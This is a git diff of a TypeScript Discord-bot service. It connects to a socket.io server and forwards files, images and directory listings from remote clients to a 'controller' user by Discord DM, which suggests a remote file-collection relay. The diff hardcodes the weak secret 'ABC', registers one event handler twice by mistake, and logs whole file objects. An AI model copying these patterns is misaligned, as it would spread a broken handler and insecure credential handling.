@@ -3,11 +3,28 @@ import { Logger } from "@/shared/Logger";
 import { type FileMulter } from "@/types/Multer";
 import { Manager } from "socket.io-client";
 import { AttachmentBuilder } from "discord.js";
+import { type GetFilesFolder, type FileMulterWs } from "@/types/Ws";
+
+export interface Folders {
+	files: DirEntry[];
+}
+
+interface DirEntry {
+	/** The name of the entry (file name with extension or directory name). */
+	name: string;
+	/** Specifies whether this entry is a directory or not. */
+	isDirectory: boolean;
+	/** Specifies whether this entry is a file or not. */
+	isFile: boolean;
+	/** Specifies whether this entry is a symlink or not. */
+	isSymlink: boolean;
+}
 
 export default class WsService {
 	static async startWsServer(client: DiscordClient) {
 		const manager = new Manager("wss://preview.luqueee.dev", {
 			autoConnect: true,
+
 			query: {
 				secret: "ABC"
 			}
@@ -46,9 +63,58 @@ export default class WsService {
 				Logger.warn(`Owner not found for ID: ${controllerid}`);
 			}
 		});
+
+		ws.on("sendImageToController", async (data: FileMulterWs) => {
+			const { controllerid, file } = data;
+
+			const fileSize = (file.metadata.size / 1024 / 1024).toFixed(2);
+
+			Logger.info(
+				"Received image from client",
+				JSON.stringify(file.metadata),
+				"to controller",
+				controllerid
+			);
+
+			const owner = await client.users.fetch(controllerid);
+			if (owner) {
+				const attachment = new AttachmentBuilder(Buffer.from(file.buffer), {
+					name: file.metadata.filename
+				});
+
+				const embed = {
+					title: "File Received",
+					description: `**file name:** ${file.metadata.filename} \n **type:** ${file.metadata.format} \n**file size:** ${fileSize} MB`,
+
+					color: 0x00ff00
+				};
+
+				await owner.send({
+					content: `Image from: ${controllerid}`,
+					embeds: [embed],
+					files: [attachment]
+				});
+				Logger.info(`Image sent to owner with ID: ${controllerid}`);
+			} else {
+				Logger.warn(`Owner not found for ID: ${controllerid}`);
+			}
+		});
+
+		ws.on("sendImageToController", async (data: GetFilesFolder) => {
+			const { controllerid, files } = data;
+
+			Logger.info(
+				"Received files from client",
+				JSON.stringify(files),
+				"to controller",
+				controllerid
+			);
+		});
+
 		ws.on("downloadFile", async (data: { controllerid: string; file: FileMulter }) => {
 			const { controllerid, file } = data;
 
+			console.log(file);
 			const fileSize = (file.size / 1024 / 1024).toFixed(2);
 
 			const owner = await client.users.fetch(controllerid);
@@ -61,23 +127,27 @@ export default class WsService {
 				})
 			);
 
-			if (owner) {
-				const attachment = new AttachmentBuilder(file.buffer, { name: file.originalname });
-				const embed = {
-					title: "File Received",
-					description: `**client id:** ${controllerid} \n **file name:** ${file.originalname} \n **type:** ${file.mimetype} \n**file size:** ${fileSize} MB`,
+			try {
+				if (owner) {
+					const attachment = new AttachmentBuilder(file.buffer, { name: file.originalname });
+					const embed = {
+						title: "File Received",
+						description: `**file name:** ${file.originalname} \n **type:** ${file.mimetype} \n**file size:** ${fileSize} MB`,
 
-					color: 0x00ff00
-				};
+						color: 0x00ff00
+					};
 
-				await owner.send({
-					// content: `File from: ${controllerid}`,
-					embeds: [embed],
-					files: [attachment]
-				});
-				Logger.info(`File sent to owner with ID: ${controllerid}`);
-			} else {
-				Logger.warn(`Owner not found for ID: ${controllerid}`);
+					await owner.send({
+						// content: `File from: ${controllerid}`,
+						embeds: [embed],
+						files: [attachment]
+					});
+					Logger.info(`File sent to owner with ID: ${controllerid}`);
+				} else {
+					Logger.warn(`Owner not found for ID: ${controllerid}`);
+				}
+			} catch (error) {
+				Logger.error("Error sending file", error);
 			}
 		});
 
